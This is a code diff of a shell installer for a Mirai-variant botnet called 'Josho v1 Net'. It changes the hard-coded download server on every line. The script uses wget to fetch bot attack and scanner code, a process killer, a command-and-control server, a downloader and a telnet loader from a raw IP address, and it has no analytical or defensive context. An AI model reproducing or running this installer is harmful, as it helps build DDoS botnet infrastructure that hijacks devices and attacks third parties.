@@ -102,11 +102,11 @@ sleep 1.0
 echo -e "${LIGHTRED}Now installing Josho v1 Net files.."
 sleep 1.0
 echo -e ""
-wget -q http://74.91.115.32/mirai/build.sh -O build.sh
-wget -q http://74.91.115.32/mirai/build_payload.py -O build_payload.py
-wget -q http://74.91.115.32/mirai/enc.c -O enc.c
-wget -q http://74.91.115.32/mirai/scanListen.go -O scanListen.go
-wget -q http://74.91.115.32/mirai/sql.sh -O sql.sh
+wget -q http://74.91.122.216/mirai/build.sh -O build.sh
+wget -q http://74.91.122.216/mirai/build_payload.py -O build_payload.py
+wget -q http://74.91.122.216/mirai/enc.c -O enc.c
+wget -q http://74.91.122.216/mirai/scanListen.go -O scanListen.go
+wget -q http://74.91.122.216/mirai/sql.sh -O sql.sh
 
 echo -e "${LIGHTRED}Making Directory (bot).."
 sleep 1.0
@@ -115,27 +115,27 @@ sleep 1.0
 echo -e ""
 mkdir bot
 cd bot
-wget -q http://74.91.115.32/mirai/bot/attack.c -O attack.c
-wget -q http://74.91.115.32/mirai/bot/attack_method.c -O attack_method.c
-wget -q http://74.91.115.32/mirai/bot/attack.h -O attack.h
-wget -q http://74.91.115.32/mirai/bot/checksum.h -O checksum.h
-wget -q http://74.91.115.32/mirai/bot/checksum.c -O checksum.c
-wget -q http://74.91.115.32/mirai/bot/includes.h -O includes.h
-wget -q http://74.91.115.32/mirai/bot/desktop.ini -O desktop.ini
-wget -q http://74.91.115.32/mirai/bot/killer.c -O killer.c
-wget -q http://74.91.115.32/mirai/bot/killer.h -O killer.h
-wget -q http://74.91.115.32/mirai/bot/main.c -O main.c
-wget -q http://74.91.115.32/mirai/bot/protocol.h -O protocol.h
-wget -q http://74.91.115.32/mirai/bot/rand.c -O rand.c
-wget -q http://74.91.115.32/mirai/bot/rand.h -O rand.h
-wget -q http://74.91.115.32/mirai/bot/resolv.c -O resolv.c
-wget -q http://74.91.115.32/mirai/bot/resolv.h -O resolv.h
-wget -q http://74.91.115.32/mirai/bot/scanner.c -O scanner.c
-wget -q http://74.91.115.32/mirai/bot/scanner.h -O scanner.h
-wget -q http://74.91.115.32/mirai/bot/table.c -O table.c
-wget -q http://74.91.115.32/mirai/bot/util.c -O util.c
-wget -q http://74.91.115.32/mirai/bot/table.h -O table.h
-wget -q http://74.91.115.32/mirai/bot/util.h -O util.h
+wget -q http://74.91.122.216/mirai/bot/attack.c -O attack.c
+wget -q http://74.91.122.216/mirai/bot/attack_method.c -O attack_method.c
+wget -q http://74.91.122.216/mirai/bot/attack.h -O attack.h
+wget -q http://74.91.122.216/mirai/bot/checksum.h -O checksum.h
+wget -q http://74.91.122.216/mirai/bot/checksum.c -O checksum.c
+wget -q http://74.91.122.216/mirai/bot/includes.h -O includes.h
+wget -q http://74.91.122.216/mirai/bot/desktop.ini -O desktop.ini
+wget -q http://74.91.122.216/mirai/bot/killer.c -O killer.c
+wget -q http://74.91.122.216/mirai/bot/killer.h -O killer.h
+wget -q http://74.91.122.216/mirai/bot/main.c -O main.c
+wget -q http://74.91.122.216/mirai/bot/protocol.h -O protocol.h
+wget -q http://74.91.122.216/mirai/bot/rand.c -O rand.c
+wget -q http://74.91.122.216/mirai/bot/rand.h -O rand.h
+wget -q http://74.91.122.216/mirai/bot/resolv.c -O resolv.c
+wget -q http://74.91.122.216/mirai/bot/resolv.h -O resolv.h
+wget -q http://74.91.122.216/mirai/bot/scanner.c -O scanner.c
+wget -q http://74.91.122.216/mirai/bot/scanner.h -O scanner.h
+wget -q http://74.91.122.216/mirai/bot/table.c -O table.c
+wget -q http://74.91.122.216/mirai/bot/util.c -O util.c
+wget -q http://74.91.122.216/mirai/bot/table.h -O table.h
+wget -q http://74.91.122.216/mirai/bot/util.h -O util.h
 
 cd
 echo -e "${LIGHTCYAN}Finished installing Bot Files.."
@@ -145,12 +145,12 @@ sleep 1.0
 echo -e ""
 mkdir cnc
 cd cnc
-wget -q http://74.91.115.32/mirai/cnc/admin.go -O admin.go
-wget -q http://74.91.115.32/mirai/cnc/attack.go -O attack.go
-wget -q http://74.91.115.32/mirai/cnc/clientList.go -O clientList.go
-wget -q http://74.91.115.32/mirai/cnc/bot.go -O bot.go
-wget -q http://74.91.115.32/mirai/cnc/main.go -O main.go
-wget -q http://74.91.115.32/mirai/cnc/database.go -O database.go
+wget -q http://74.91.122.216/mirai/cnc/admin.go -O admin.go
+wget -q http://74.91.122.216/mirai/cnc/attack.go -O attack.go
+wget -q http://74.91.122.216/mirai/cnc/clientList.go -O clientList.go
+wget -q http://74.91.122.216/mirai/cnc/bot.go -O bot.go
+wget -q http://74.91.122.216/mirai/cnc/main.go -O main.go
+wget -q http://74.91.122.216/mirai/cnc/database.go -O database.go
 
 cd
 echo -e "${LIGHTCYAN}Finished installing cnc Files.."
@@ -160,7 +160,7 @@ sleep 1.0
 echo -e ""
 mkdir dlr
 cd dlr
-wget -q http://74.91.115.32/mirai/dlr/main.c -O main.c
+wget -q http://74.91.122.216/mirai/dlr/main.c -O main.c
 mkdir release
 cd
 echo -e "${LIGHTCYAN}Finished!"
@@ -182,20 +182,20 @@ echo -e ""
 mkdir bins
 mkdir src
 cd src
-wget -q http://74.91.115.32/mirai/loader/src/binary.c -O binary.c
-wget -q http://74.91.115.32/mirai/loader/src/connection.c -O connection.c
-wget -q http://74.91.115.32/mirai/loader/src/main.c -O main.c
-wget -q http://74.91.115.32/mirai/loader/src/server.c -O server.c
-wget -q http://74.91.115.32/mirai/loader/src/telnet_info.c -O telnet_info.c
-wget -q http://74.91.115.32/mirai/loader/src/util.c -O util.c
+wget -q http://74.91.122.216/mirai/loader/src/binary.c -O binary.c
+wget -q http://74.91.122.216/mirai/loader/src/connection.c -O connection.c
+wget -q http://74.91.122.216/mirai/loader/src/main.c -O main.c
+wget -q http://74.91.122.216/mirai/loader/src/server.c -O server.c
+wget -q http://74.91.122.216/mirai/loader/src/telnet_info.c -O telnet_info.c
+wget -q http://74.91.122.216/mirai/loader/src/util.c -O util.c
 mkdir headers
 cd headers
-wget -q http://74.91.115.32/mirai/loader/src/headers/binary.h -O binary.h
-wget -q http://74.91.115.32/mirai/loader/src/headers/connection.h -O connection.h
-wget -q http://74.91.115.32/mirai/loader/src/headers/includes.h -O includes.h
-wget -q http://74.91.115.32/mirai/loader/src/headers/server.h -O server.h
-wget -q http://74.91.115.32/mirai/loader/src/headers/telnet_info.h -O telnet_info.h
-wget -q http://74.91.115.32/mirai/loader/src/headers/util.h -O util.h
+wget -q http://74.91.122.216/mirai/loader/src/headers/binary.h -O binary.h
+wget -q http://74.91.122.216/mirai/loader/src/headers/connection.h -O connection.h
+wget -q http://74.91.122.216/mirai/loader/src/headers/includes.h -O includes.h
+wget -q http://74.91.122.216/mirai/loader/src/headers/server.h -O server.h
+wget -q http://74.91.122.216/mirai/loader/src/headers/telnet_info.h -O telnet_info.h
+wget -q http://74.91.122.216/mirai/loader/src/headers/util.h -O util.h
 cd
 cd
 read
